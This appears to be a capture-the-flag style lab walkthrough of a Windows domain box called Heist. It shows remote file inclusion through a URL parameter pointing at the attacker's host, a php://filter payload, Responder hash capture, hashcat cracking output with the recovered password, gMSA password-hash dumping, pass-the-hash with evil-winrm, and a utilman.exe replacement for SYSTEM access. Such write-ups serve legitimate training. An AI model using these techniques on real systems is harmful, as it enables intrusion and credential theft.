This website has a button that apparently loads files from an url.

I hosted a test file on my kali machine and confirmed the parameter `?url=` seems to be vulnerable to `Remote File Inclusion`:

![[Pasted image 20231106201531.png]]

#### Vulnerable URL: http://192.168.198.165:8080/?url=http://192.168.45.229/test.txt 

```bash
php://filter/convert.base64-encode/resource=../../../../../boot.ini
```

however, the server will try to read files and open them from the root path.

During this process, if we run responder, we may be able to grab `HEIST\enox` hash when the server tries to authenticate to our kali IP:

![[Pasted image 20231106212421.png]]

Next, using hashcat -m 5600, we can crack the hash for enox.

```
ENOX::HEIST:4bef2dd069169d63:4eaeb408d8810f3fc44e79ba4a05f0c9:0101000000000000eb6dd0142111da0114815b24cd9f74dd0000000002000800370035005600520001001e00570049004e002d00310039004700530032004400490043003500300049000400140037003500560052002e004c004f00430041004c0003003400570049004e002d00310039004700530032004400490043003500300049002e0037003500560052002e004c004f00430041004c000500140037003500560052002e004c004f00430041004c000800300030000000000000000000000000300000c856f6898bee6992d132cc256ac1c2292f725d1c9cb0a2bb6f2ea6dd672384220a001000000000000000000000000000000000000900260048005400540050002f003100390032002e003100360038002e00340035002e003200320039000000000000000000:california
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ENOX::HEIST:4bef2dd069169d63:4eaeb408d8810f3fc44e79...000000
Time.Started.....: Mon Nov  6 21:22:44 2023 (0 secs)
Time.Estimated...: Mon Nov  6 21:22:44 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   309.6 kH/s (1.44ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> bethany
Hardware.Mon.#1..: Util: 51%

```

### `HEIST\enox:california`

Using CME, we can confirm we are remote management user and can log into the DC via winrm using `evil-winrm`.


Next, running sharpHound we can see that enox is part of the WebAdmin group. Also WebAdmin group has GMSAReadPassword privilege over the group managed service account `svc_apache$`.

```
PS C:\Users\enox\Documents> ./GMSAPasswordReader.exe --AccountName SVC_APACHE$
./GMSAPasswordReader.exe --AccountName SVC_APACHE$
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : D1FAF00D1D022EB241618575F7A624DB
[*]       aes128_cts_hmac_sha1 : F10FCD213C9C2101E2A5AB2E62F96B9B
[*]       aes256_cts_hmac_sha1 : C8FE93674FFC678CE0567379BCF90A718217B34EB581DFD1E0B35279859C2313
[*]       des_cbc_md5          : 9E340723700454E9

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : B8730DFF931E27DC2D3A77BBDA4B5253
[*]       aes128_cts_hmac_sha1 : E4A2B58F686F64C56026456196555C32
[*]       aes256_cts_hmac_sha1 : D2CF4C019A5EAC62F432AF99B230F9079658DC8A0071E4E2F11C1EF0FA257756
[*]       des_cbc_md5          : 7CBFF2A41FC2D0D6

```


Now the rc4_hmac hash is the same as NT hash, so it can be use in cme, evil-winrm and other pass the hash tools.

Since we now, svc_apache is part of the winrm group, we log in using evil-winrm and the rc4 hash.

Enumerating privielge on the machine for svc_apache$, we found that it has the SeRestore privilege which we can use to replace utilman.exe with cmd.exe and log in as system via rdesktop and pressing win + u key :D

![[Pasted image 20231106231313.png]]
![[Pasted image 20231106231330.png]]

`rdesktop 192.168.198.165 `

![[Pasted image 20231106225810.png]]
